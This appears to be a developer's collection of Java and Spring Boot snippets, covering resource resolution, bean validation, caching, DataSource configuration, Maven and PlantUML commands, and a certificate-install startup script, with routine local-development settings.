	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.core.io.Resource;
import org.springframework.core.io.ResourceLoader;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;

import java.io.IOException;
import java.util.Arrays;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SingleAppResourcePatternResolver extends PathMatchingResourcePatternResolver {

    public static final Pattern JAR_NAME_PATTERN = Pattern.compile(".*/(.+?\\.jar).*");

    private Set<String> dependencyJars;

    public SingleAppResourcePatternResolver(ResourceLoader resourceLoader, Set<String> dependencyJars) {
        super(resourceLoader);
        this.dependencyJars = dependencyJars;
    }

    @Override
    public Resource[] getResources(String locationPattern) throws IOException {
        Resource[] resources = super.getResources(locationPattern);
        return Arrays.stream(resources)
                .filter(this::foundInDependencies)
                .toArray(Resource[]::new);
    }

    private boolean foundInDependencies(Resource resource) {
        try {
            String url = resource.getURL().toString();
            if (url.contains("META-INF/resources/webjars/")) {
                // WebJAR resources could be loaded from shared dependencies
                return true;
            }

            Matcher matcher = JAR_NAME_PATTERN.matcher(url);
            if (matcher.find()) {
                String jarName = matcher.group(1);
                return dependencyJars.contains(jarName);
            }
            return true;
        } catch (IOException e) {
            throw new RuntimeException("An error occurred while looking for resources", e);
        }
    }
}
--------------------------------------------------------------------------------------------------------
import javax.annotation.Nullable;
import java.util.*;

/**
 * Describes an app component which the current application depends on.
 */
public class AppComponent implements Comparable<AppComponent> {

    private final String id;
    private final List<AppComponent> dependencies = new ArrayList<>();
    private Properties properties;
    private Set<String> additiveProperties;

    public AppComponent(String id) {
        this.id = id;
    }

    /**
     * @return app component Id
     */
    public String getId() {
        return id;
    }

    /**
     * @return descriptor path by convention
     */
    public String getDescriptorPath() {
        return id.replace('.', '/') + "/app-component.xml";
    }

    /**
     * INTERNAL.
     * Add a dependency to the component.
     */
    public void addDependency(AppComponent other) {
        if (dependencies.contains(other))
            return;
        if (other.dependsOn(this))
            throw new RuntimeException("Circular dependency between app components '" + this + "' and '" + other + "'");

        dependencies.add(other);
    }

    /**
     * Check if this component depends on the given component.
     */
    public boolean dependsOn(AppComponent other) {
        for (AppComponent dependency : dependencies) {
            if (dependency.equals(other) || dependency.dependsOn(other))
                return true;
        }
        return false;
    }

    /**
     * INTERNAL.
     * Set a file-based app property defined in this app component.
     */
    public void setProperty(String name, String value, boolean additive) {
        if (properties == null)
            properties = new Properties();

        if (additive) {
            if (additiveProperties == null) {
                additiveProperties = new HashSet<>();
            }
            additiveProperties.add(name);
        } else if (additiveProperties != null) {
            additiveProperties.remove(name);
        }

        properties.setProperty(name, value);
    }

    /**
     * @return a file-based app property defined in this app component or null if not found
     */
    @Nullable
    public String getProperty(String property) {
        return properties == null ? null : properties.getProperty(property);
    }

    public boolean isAdditiveProperty(String property) {
        return additiveProperties != null && additiveProperties.contains(property);
    }

    /**
     * @return names of properties exported by this app component, sorted in natural order
     */
    public List<String> getPropertyNames() {
        if (properties == null) {
            return Collections.emptyList();
        }
        List<String> list = new ArrayList<>(properties.stringPropertyNames());
        list.sort(Comparator.naturalOrder());
        return list;
    }

    @Override
    public int compareTo(AppComponent other) {
        if (this.dependsOn(other))
            return 1;
        if (other.dependsOn(this)) {
            return -1;
        }
        return 0;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        AppComponent that = (AppComponent) o;

        return id.equals(that.id);

    }

    @Override
    public int hashCode() {
        return id.hashCode();
    }

    @Override
    public String toString() {
        return id;
    }
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.MessageTools;
import com.haulmont.cuba.core.global.Messages;
import org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTerm;
import org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTermType;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.Token;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.TokenCollector;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.TokenIterator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.el.ExpressionFactory;
import javax.validation.MessageInterpolator;
import javax.validation.ValidationException;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CubaValidationMessagesInterpolator implements MessageInterpolator {
    protected static final String DEFAULT_CONSTRAINTS_MESSAGE_PACK = "com.haulmont.cuba.core.global.validation";

    private final Logger log = LoggerFactory.getLogger(CubaValidationMessagesInterpolator.class);

    protected Messages messages;
    protected ExpressionFactory expressionFactory;
    protected Locale locale;

    protected static final Pattern LEFT_BRACE = Pattern.compile("\\{", Pattern.LITERAL);
    protected static final Pattern RIGHT_BRACE = Pattern.compile("\\}", Pattern.LITERAL);
    protected static final Pattern SLASH = Pattern.compile("\\\\", Pattern.LITERAL);
    protected static final Pattern DOLLAR = Pattern.compile("\\$", Pattern.LITERAL);

    public CubaValidationMessagesInterpolator(Messages messages, Locale locale) {
        this.messages = messages;
        this.locale = locale;
        this.expressionFactory = ExpressionFactory.newInstance();
    }

    @Override
    public String interpolate(String messageTemplate, Context context) {
        Locale defaultLocale = locale;
        return interpolate(messageTemplate, context, defaultLocale);
    }

    @Override
    public String interpolate(String messageTemplate, Context context, Locale locale) {
        String interpolatedMessage = messageTemplate;
        try {
            interpolatedMessage = interpolateMessage(messageTemplate, context, locale);
        } catch (ValidationException e) {
            log.error("Unable to interpolate validation message: {}", e.getMessage());
        }
        return interpolatedMessage;
    }

    protected String interpolateMessage(String messageTemplate, Context context, Locale locale) {
        String resolvedMessage = interpolateMessage(messageTemplate, locale);

        TokenCollector tokenCollector = new TokenCollector(resolvedMessage, InterpolationTermType.PARAMETER);
        List<Token> tokens = tokenCollector.getTokenList();

        resolvedMessage = interpolateExpression(new TokenIterator(tokens), context, locale);

        tokenCollector = new TokenCollector(resolvedMessage, InterpolationTermType.EL);
        tokens = tokenCollector.getTokenList();

        resolvedMessage = interpolateExpression(new TokenIterator(tokens), context, locale);

        resolvedMessage = replaceEscapedLiterals(resolvedMessage);

        return resolvedMessage;
    }

    protected String interpolateExpression(TokenIterator tokenIterator, Context context, Locale locale) {
        while (tokenIterator.hasMoreInterpolationTerms()) {
            String term = tokenIterator.nextInterpolationTerm();

            InterpolationTerm expression = new InterpolationTerm(term, locale, expressionFactory);
            String resolvedExpression = expression.interpolate(context);
            tokenIterator.replaceCurrentInterpolationTerm(resolvedExpression);
        }
        return tokenIterator.getInterpolatedMessage();
    }

    protected String replaceEscapedLiterals(String resolvedMessage) {
        resolvedMessage = LEFT_BRACE.matcher(resolvedMessage).replaceAll("{");
        resolvedMessage = RIGHT_BRACE.matcher(resolvedMessage).replaceAll("}");
        resolvedMessage = SLASH.matcher(resolvedMessage).replaceAll(Matcher.quoteReplacement("\\"));
        resolvedMessage = DOLLAR.matcher(resolvedMessage).replaceAll(Matcher.quoteReplacement("$"));
        return resolvedMessage;
    }

    protected String interpolateMessage(String message, Locale locale) {
        TokenCollector tokenCollector = new TokenCollector(message, InterpolationTermType.PARAMETER);
        TokenIterator tokenIterator = new TokenIterator(tokenCollector.getTokenList());
        while (tokenIterator.hasMoreInterpolationTerms()) {
            String term = tokenIterator.nextInterpolationTerm();
            String resolvedParameterValue = resolveParameter(term, locale);
            tokenIterator.replaceCurrentInterpolationTerm(resolvedParameterValue);
        }
        return tokenIterator.getInterpolatedMessage();
    }

    protected String resolveParameter(String parameterName, Locale locale) {
        String parameterValue;
        String messageCode = removeCurlyBraces(parameterName);
        try {
            if (messageCode.startsWith("javax.validation.constraints")
                    || messageCode.startsWith("org.hibernate.validator.constraints")) {
                parameterValue = messages.getMessage(DEFAULT_CONSTRAINTS_MESSAGE_PACK, messageCode, locale);
                // try to find tokens recursive
                parameterValue = interpolateMessage(parameterValue, locale);
            } else if (messageCode.startsWith(MessageTools.MARK) || messageCode.startsWith(MessageTools.MAIN_MARK)) {
                parameterValue = messages.getTools().loadString(messageCode, locale);
                // try to find tokens recursive
                parameterValue = interpolateMessage(parameterValue, locale);
            } else {
                parameterValue = parameterName;
            }
        } catch (UnsupportedOperationException e) {
            // return parameter itself
            parameterValue = parameterName;
        }
        return parameterValue;
    }

    protected String removeCurlyBraces(String parameter) {
        return parameter.substring(1, parameter.length() - 1);
    }
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.EntityStates;
import com.haulmont.cuba.core.global.Metadata;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.validation.Path;
import javax.validation.TraversableResolver;
import java.lang.annotation.ElementType;

public class CubaValidationTraversableResolver implements TraversableResolver {

    private static final Logger log = LoggerFactory.getLogger(CubaValidationTraversableResolver.class);

    protected Metadata metadata;
    protected EntityStates entityStates;

    public CubaValidationTraversableResolver(Metadata metadata, EntityStates entityStates) {
        this.metadata = metadata;
        this.entityStates = entityStates;
    }

    @Override
    public final boolean isReachable(Object traversableObject,
                                     Path.Node traversableProperty,
                                     Class<?> rootBeanType,
                                     Path pathToTraversableObject,
                                     ElementType elementType) {
        log.trace("Calling isReachable on object {} with node name {}",
                traversableObject, traversableProperty.getName());

        if (traversableObject == null
                || metadata.getClass(traversableObject.getClass()) == null) {
            return true;
        }

        return entityStates.isLoaded(traversableObject, traversableProperty.getName());
    }

    @Override
    public boolean isCascadable(Object traversableObject, Path.Node traversableProperty, Class<?> rootBeanType,
                                Path pathToTraversableObject, ElementType elementType) {
        // return true as org.hibernate.validator.internal.engine.resolver.JPATraversableResolver does
        return true;
    }
}
--------------------------------------------------------------------------------------------------------
import javax.validation.ClockProvider;
import java.time.Clock;
import java.time.ZonedDateTime;

public class CubaValidationTimeProvider implements ClockProvider {

    protected TimeSource timeSource;

    public CubaValidationTimeProvider(TimeSource timeSource) {
        this.timeSource = timeSource;
    }

    @Override
    public Clock getClock() {
        ZonedDateTime now = timeSource.now();
        return Clock.fixed(now.toInstant(), now.getZone());
    }
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.*;
import com.haulmont.cuba.core.sys.validation.CubaValidationMessagesInterpolator;
import com.haulmont.cuba.core.sys.validation.CubaValidationTimeProvider;
import com.haulmont.cuba.core.sys.validation.CubaValidationTraversableResolver;
import org.hibernate.validator.HibernateValidator;
import org.hibernate.validator.HibernateValidatorConfiguration;
import org.hibernate.validator.cfg.ConstraintMapping;
import org.springframework.stereotype.Component;

import javax.annotation.Nullable;
import javax.inject.Inject;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;

import static com.haulmont.bali.util.Preconditions.checkNotNullArgument;

@Component(BeanValidation.NAME)
public class BeanValidationImpl implements BeanValidation {

    public static final ValidationOptions NO_VALIDATION_OPTIONS = new ValidationOptions();

    @Inject
    protected Messages messages;
    @Inject
    protected Metadata metadata;
    @Inject
    protected TimeSource timeSource;
    @Inject
    protected UserSessionSource userSessionSource;
    @Inject
    protected EntityStates entityStates;

    protected ConcurrentHashMap<Locale, ValidatorFactory> validatorFactoriesCache = new ConcurrentHashMap<>();

    @Override
    public Validator getValidator() {
        Locale locale = getCurrentLocale();

        return getValidatorWithDefaultFactory(locale);
    }

    @Override
    public Validator getValidator(ConstraintMapping constraintMapping) {
        checkNotNullArgument(constraintMapping);

        return getValidator(constraintMapping, NO_VALIDATION_OPTIONS);
    }

    @Override
    public Validator getValidator(@Nullable ConstraintMapping constraintMapping, ValidationOptions options) {
        checkNotNullArgument(options);

        if (constraintMapping == null
                && options.getFailFast() == null
                && options.getLocale() != null) {
            return getValidatorWithDefaultFactory(options.getLocale());
        }

        Locale locale;
        if (options.getLocale() != null) {
            locale = options.getLocale();
        } else {
            locale = getCurrentLocale();
        }

        HibernateValidatorConfiguration configuration = getValidatorFactoryConfiguration(locale);
        if (options.getFailFast() != null) {
            configuration.failFast(options.getFailFast());
        }
        if (constraintMapping != null) {
            configuration.addMapping(constraintMapping);
        }

        ValidatorFactory factory = configuration.buildValidatorFactory();
        return factory.getValidator();
    }

    protected Validator getValidatorWithDefaultFactory(Locale locale) {
        ValidatorFactory validatorFactoryFromCache = validatorFactoriesCache.get(locale);
        if (validatorFactoryFromCache != null) {
            return validatorFactoryFromCache.getValidator();
        }

        HibernateValidatorConfiguration configuration = getValidatorFactoryConfiguration(locale);
        ValidatorFactory factory = configuration.buildValidatorFactory();

        validatorFactoriesCache.put(locale, factory);

        return factory.getValidator();
    }

    protected HibernateValidatorConfiguration getValidatorFactoryConfiguration(Locale locale) {
        @SuppressWarnings("UnnecessaryLocalVariable")
        HibernateValidatorConfiguration configuration = Validation.byProvider(HibernateValidator.class)
                .configure()
                .clockProvider(new CubaValidationTimeProvider(timeSource))
                .traversableResolver(new CubaValidationTraversableResolver(metadata, entityStates))
                .messageInterpolator(new CubaValidationMessagesInterpolator(messages, locale));

        return configuration;
    }

    protected Locale getCurrentLocale() {
        Locale locale;
        if (userSessionSource.checkCurrentUserSession()) {
            locale = userSessionSource.getLocale();
        } else {
            locale = messages.getTools().getDefaultLocale();
        }
        return locale;
    }
}
=======
LinkedMultiValueMap<String, Object> map = new LinkedMultiValueMap<>();
map.add("file", new ClassPathResource(file));
HttpHeaders headers = new HttpHeaders();
headers.setContentType(MediaType.MULTIPART_FORM_DATA);

HttpEntity<LinkedMultiValueMap<String, Object>> requestEntity = new    HttpEntity<LinkedMultiValueMap<String, Object>>(
                    map, headers);
ResponseEntity<String> result = template.get().exchange(
                    contextPath.get() + path, HttpMethod.POST, requestEntity,
                    String.class);
>>>>>>> b494d6cea61253f648b912ce216862387070907c
--------------------------------------------------------------------------------------------------------
    /**
     * Default parsing patterns
     */
    private static final String UPPER = "\\p{Lu}|\\P{InBASIC_LATIN}";
    private static final String LOWER = "\\p{Ll}";
    private static final String CAMEL_CASE_REGEX = "(?<!(^|[%u_$]))(?=[%u])|(?<!^)(?=[%u][%l])".replace("%u", UPPER).replace("%l", LOWER);
    /**
     * Default camel case {@link Pattern}
     */
    private static final Pattern CAMEL_CASE = Pattern.compile(CAMEL_CASE_REGEX);
	
	    /**
     * Returns {@link List} by input source {@link String} and 
     * @param source
     * @param toLower
     * @return
     */
    private static List<String> split(final String source, final boolean toLower) {
        Objects.requireNonNull(source, "Source string must not be null!");
        final List<String> result = CAMEL_CASE.splitAsStream(source).map(i -> toLower ? i.toLowerCase() : i).collect(Collectors.toList());
        return Collections.unmodifiableList(result);
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.concurrent.ConcurrentMapCache;
import org.springframework.cache.concurrent.ConcurrentMapCacheManager;
import org.springframework.cache.support.SimpleCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import static java.util.Arrays.asList;

@Configuration
@EnableCaching
public class MailCacheConfiguration {

    /**
     * Default mail cache names
     */
    public static final String DEFAULT_MAIL_FOLDER_CACHE = "MAIL_FOLDER_CACHE";
    public static final String DEFAULT_MAIL_STORE_CACHE = "MAIL_STORE_CACHE";

//    @Bean
//    public CacheManager cacheManager() {
//        final SimpleCacheManager cacheManager = new SimpleCacheManager();
//        cacheManager.setCaches(asList(this.mailFolderCache(), this.mailStoreCache()));
//        cacheManager.afterPropertiesSet();
//        return cacheManager;
//    }

    @Bean
    public CacheManager cacheManager() {
        final ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager("addresses");
        cacheManager.setAllowNullValues(false);
        cacheManager.setCacheNames(asList(DEFAULT_MAIL_FOLDER_CACHE, DEFAULT_MAIL_STORE_CACHE));
        return cacheManager;
    }

    @Bean
    public Cache mailFolderCache() {
        return new ConcurrentMapCache(DEFAULT_MAIL_FOLDER_CACHE);
    }

    @Bean
    public Cache mailStoreCache() {
        return new ConcurrentMapCache(DEFAULT_MAIL_STORE_CACHE);
    }
}
--------------------------------------------------------------------------------------------------------
@CacheEvict(value = {DEFAULT_MAIL_FOLDER_CACHE, DEFAULT_MAIL_STORE_CACHE}, allEntries = true)
public void destroy() {
}
	
@Caching(evict = { 
  @CacheEvict("addresses"), 
  @CacheEvict(value="directory", key="#customer.name") })
public String getAddress(Customer customer) {...}
--------------------------------------------------------------------------------------------------------
/*
 * Copyright 2012-2018 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.springframework.boot.autoconfigure.jdbc;

import javax.sql.DataSource;
import javax.sql.XADataSource;

import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.condition.AnyNestedCondition;
import org.springframework.boot.autoconfigure.condition.ConditionMessage;
import org.springframework.boot.autoconfigure.condition.ConditionOutcome;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.boot.autoconfigure.condition.SpringBootCondition;
import org.springframework.boot.autoconfigure.jdbc.metadata.DataSourcePoolMetadataProvidersConfiguration;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.boot.jdbc.DataSourceBuilder;
import org.springframework.boot.jdbc.EmbeddedDatabaseConnection;
import org.springframework.context.annotation.Condition;
import org.springframework.context.annotation.ConditionContext;
import org.springframework.context.annotation.Conditional;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.core.type.AnnotatedTypeMetadata;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType;

/**
 * {@link EnableAutoConfiguration Auto-configuration} for {@link DataSource}.
 *
 * @author Dave Syer
 * @author Phillip Webb
 * @author Stephane Nicoll
 * @author Kazuki Shimizu
 */
@Configuration
@ConditionalOnClass({ DataSource.class, EmbeddedDatabaseType.class })
@EnableConfigurationProperties(DataSourceProperties.class)
@Import({ DataSourcePoolMetadataProvidersConfiguration.class,
		DataSourceInitializationConfiguration.class })
public class DataSourceAutoConfiguration {

	@Configuration
	@Conditional(EmbeddedDatabaseCondition.class)
	@ConditionalOnMissingBean({ DataSource.class, XADataSource.class })
	@Import(EmbeddedDataSourceConfiguration.class)
	protected static class EmbeddedDatabaseConfiguration {

	}

	@Configuration
	@Conditional(PooledDataSourceCondition.class)
	@ConditionalOnMissingBean({ DataSource.class, XADataSource.class })
	@Import({ DataSourceConfiguration.Hikari.class, DataSourceConfiguration.Tomcat.class,
			DataSourceConfiguration.Dbcp2.class, DataSourceConfiguration.Generic.class,
			DataSourceJmxConfiguration.class })
	protected static class PooledDataSourceConfiguration {

	}

	/**
	 * {@link AnyNestedCondition} that checks that either {@code spring.datasource.type}
	 * is set or {@link PooledDataSourceAvailableCondition} applies.
	 */
	static class PooledDataSourceCondition extends AnyNestedCondition {

		PooledDataSourceCondition() {
			super(ConfigurationPhase.PARSE_CONFIGURATION);
		}

		@ConditionalOnProperty(prefix = "spring.datasource", name = "type")
		static class ExplicitType {

		}

		@Conditional(PooledDataSourceAvailableCondition.class)
		static class PooledDataSourceAvailable {

		}

	}

	/**
	 * {@link Condition} to test if a supported connection pool is available.
	 */
	static class PooledDataSourceAvailableCondition extends SpringBootCondition {

		@Override
		public ConditionOutcome getMatchOutcome(ConditionContext context,
				AnnotatedTypeMetadata metadata) {
			ConditionMessage.Builder message = ConditionMessage
					.forCondition("PooledDataSource");
			if (getDataSourceClassLoader(context) != null) {
				return ConditionOutcome
						.match(message.foundExactly("supported DataSource"));
			}
			return ConditionOutcome
					.noMatch(message.didNotFind("supported DataSource").atAll());
		}

		/**
		 * Returns the class loader for the {@link DataSource} class. Used to ensure that
		 * the driver class can actually be loaded by the data source.
		 * @param context the condition context
		 * @return the class loader
		 */
		private ClassLoader getDataSourceClassLoader(ConditionContext context) {
			Class<?> dataSourceClass = DataSourceBuilder
					.findType(context.getClassLoader());
			return (dataSourceClass != null) ? dataSourceClass.getClassLoader() : null;
		}

	}

	/**
	 * {@link Condition} to detect when an embedded {@link DataSource} type can be used.
	 * If a pooled {@link DataSource} is available, it will always be preferred to an
	 * {@code EmbeddedDatabase}.
	 */
	static class EmbeddedDatabaseCondition extends SpringBootCondition {

		private final SpringBootCondition pooledCondition = new PooledDataSourceCondition();

		@Override
		public ConditionOutcome getMatchOutcome(ConditionContext context,
				AnnotatedTypeMetadata metadata) {
			ConditionMessage.Builder message = ConditionMessage
					.forCondition("EmbeddedDataSource");
			if (anyMatches(context, metadata, this.pooledCondition)) {
				return ConditionOutcome
						.noMatch(message.foundExactly("supported pooled data source"));
			}
			EmbeddedDatabaseType type = EmbeddedDatabaseConnection
					.get(context.getClassLoader()).getType();
			if (type == null) {
				return ConditionOutcome
						.noMatch(message.didNotFind("embedded database").atAll());
			}
			return ConditionOutcome.match(message.found("embedded database").items(type));
		}
	}
}
--------------------------------------------------------------------------------------------------------
"C:\Program Files\Java\jdk1.8.0_191\bin\java.exe" -Dmaven.multiModuleProjectDirectory=C:\git-project\paragon.microservices.crmmailadapter\service "-Dmaven.home=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3" "-Dclassworlds.conf=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\bin\m2.conf" "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar=23825:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\boot\plexus-classworlds-2.5.2.jar" org.codehaus.classworlds.Launcher -Didea.version=2018.3.5 -DskipTests=true com.github.markusmo3.urm:urm-maven-plugin:1.4.4:map
--------------------------------------------------------------------------------------------------------
java -jar plantuml-dependency-cli-1.4.0.jar -h
	java -jar plantuml-dependency-cli-1.4.0.jar -o /home/test/plantuml.txt -b . -dp ^(?!net.sourceforge.plantumldependency)(.+)$ -v
	java -jar plantuml-dependency-cli-1.4.0.jar -o /home/test/plantuml.txt -b . -i **/*.java -e **/*Test*.java -dn .*Test.* -v
	java -jar plantuml-dependency-cli-1.4.0.jar -o /home/test/plantuml.txt -b . -i **/*.java -e **/*Test*.java -dt implementations,interfaces,extensions,imports,static_imports
	java -jar plantuml-dependency-cli-1.4.0.jar -o myoutput.txt -b "C:\Users\PlantUML test" -i **/*Test.java
	java -jar plantuml-dependency-cli-1.4.0.jar -version -v
--------------------------------------------------------------------------------------------------------
https://search.maven.org/search?q=g:de.elnarion.util

"C:\Program Files\Java\jdk1.8.0_191\bin\java.exe" -Dmaven.multiModuleProjectDirectory=C:\git-project\paragon.microservices.crmmailadapter\service "-Dmaven.home=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3" "-Dclassworlds.conf=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\bin\m2.conf" "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar=5944:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\boot\plexus-classworlds-2.5.2.jar" org.codehaus.classworlds.Launcher -Didea.version=2018.3.5 -DskipTests=true org.springframework.boot:spring-boot-maven-plugin:2.1.4.RELEASE:build-info
"C:\Program Files\Java\jdk1.8.0_191\bin\java.exe" -Dmaven.multiModuleProjectDirectory=C:\git-project\paragon.microservices.crmmailadapter\service "-Dmaven.home=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3" "-Dclassworlds.conf=C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\bin\m2.conf" "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar=5944:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\maven\lib\maven3\boot\plexus-classworlds-2.5.2.jar" org.codehaus.classworlds.Launcher -Didea.version=2018.3.5 -DskipTests=true -Dparse.thePackage="com.paragon.microservices.crmmailadapter.mail.chain" com.github.juanmf:java2PlantUML-maven-plugin:1.0.1:parse
mvn   -Dparse.thePackage="com.paragon.microservices.crmmailadapter.mail.chain, com.paragon.microservices.crmmailadapter.mail.chain.impl, com.paragon.microservices.crmmailadapter.mail.model, com.paragon.microservices.crmmailadapter.mail.model.enumeration, com.paragon.microservices.crmmailadapter.mail.model.constant, com.paragon.microservices.crmmailadapter.mail.model.builder, com.paragon.microservices.crmmailadapter.mail.parser, com.paragon.microservices.crmmailadapter.mail.parser.impl, com.paragon.microservices.crmmailadapter.mail.parser.impl.header, com.paragon.microservices.crmmailadapter.mail.parser.impl.body" clean compile java2PlantUML:parse
--------------------------------------------------------------------------------------------------------
org.slf4j.simpleLogger.defaultLogLevel=info
org.slf4j.simpleLogger.showDateTime=false
org.slf4j.simpleLogger.showThreadName=false
org.slf4j.simpleLogger.showLogName=false
org.slf4j.simpleLogger.logFile=System.out
org.slf4j.simpleLogger.levelInBrackets=true
org.slf4j.simpleLogger.log.Sisu=info
org.slf4j.simpleLogger.warnLevelString=WARNING
--------------------------------------------------------------------------------------------------------
spring:
  # (DataSourceAutoConfiguration & DataSourceProperties)
  datasource:
    name: ds-h2
    url: jdbc:h2:D:/work/workspace/fdata;DATABASE_TO_UPPER=false
    username: h2
    password: h2
    driver-class: org.h2.Driver
	
@Configuration
@Component
public class DataSourceBean {

    @ConfigurationProperties(prefix = "spring.datasource")
    @Bean
    @Primary
    public DataSource getDataSource() {
        return DataSourceBuilder
                .create()
//                .url("jdbc:h2:D:/work/workspace/fork/gs-serving-web-content/initial/data/fdata;DATABASE_TO_UPPER=false")
//                .username("h2")
//                .password("h2")
//                .driverClassName("org.h2.Driver")
                .build();
    }
}
--------------------------------------------------------------------------------------------------------
https://<API key>@api.keycdn.com/zones/purge/<zone id>.json
--------------------------------------------------------------------------------------------------------
@GET
@Produces({"application/xml", "application/json"})
@Path("/recent/region/{regionName}/{orderLineId}")
public List<LiveSalesList> findRecentRegionFrom(@PathParam("regionName") String regionName, @PathParam("orderLineId") Integer orderLineId) {
    CriteriaBuilder cb = getEntityManager().getCriteriaBuilder();
    javax.persistence.criteria.CriteriaQuery cq = cb.createQuery();
    Root<LiveSalesList> liveSalesList = cq.from(LiveSalesList.class);
    cq.select(liveSalesList);
    cq.where(cb.and(
        cb.equal(liveSalesList.get(LiveSalesList_.region), regionName),
        cb.gt(liveSalesList.get(LiveSalesList_.orderLineId), orderLineId)
    ));
    Query q = getEntityManager().createQuery(cq);
    q.setMaxResults(500);
    return q.getResultList();
}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.Banner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.WebApplicationType;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.ComponentScan;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

@SpringBootApplication
@EnableAutoConfiguration
@EnableSwagger2
@ComponentScan(basePackages = {"io.project"})
@EntityScan("io.project.domain")
public class Application {

    public static void main(String[] args) {
        final SpringApplication application = new SpringApplication(Application.class);
        application.setBannerMode(Banner.Mode.OFF);
        application.setWebApplicationType(WebApplicationType.SERVLET);
        application.run(args);
    }
}
--------------------------------------------------------------------------------------------------------
#!/bin/bash

###
# #%L
# che-starter
# %%
# Copyright (C) 2017 Red Hat, Inc.
# %%
# All rights reserved. This program and the accompanying materials
# are made available under the terms of the Eclipse Public License v1.0
# which accompanies this distribution, and is available at
# http://www.eclipse.org/legal/epl-v10.html
# #L%
###

echo "Installing certificate into $CHE_STARTER_HOME/InstallCert/ directory"

# Import the certificate
cd $CHE_STARTER_HOME/InstallCert/

echo "Import the remote certificate from ${OSO_ADDRESS}"
java InstallCert $OSO_ADDRESS << ANSWERS
1
ANSWERS

echo "Export the certificate into the keystore for ${OSO_DOMAIN_NAME}"
keytool -exportcert -alias $OSO_DOMAIN_NAME-1 -keystore jssecacerts -storepass changeit -file $KUBERNETES_CERTS_CA_FILE

cd $CHE_STARTER_HOME/


exec java -Djava.security.egd=file:/dev/./urandom -jar ${CHE_STARTER_HOME}/app.jar $@
exit $?
--------------------------------------------------------------------------------------------------------
public static void main(String[] args) {
  Optional<Integer> maxAge = employeeList
      .stream()
      .collect(Collectors.mapping((Employee emp) -> emp.getAge(), Collectors.maxBy(Integer::compareTo)));
  System.out.println("Max Age: " + maxAge.get());
}
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### NODE
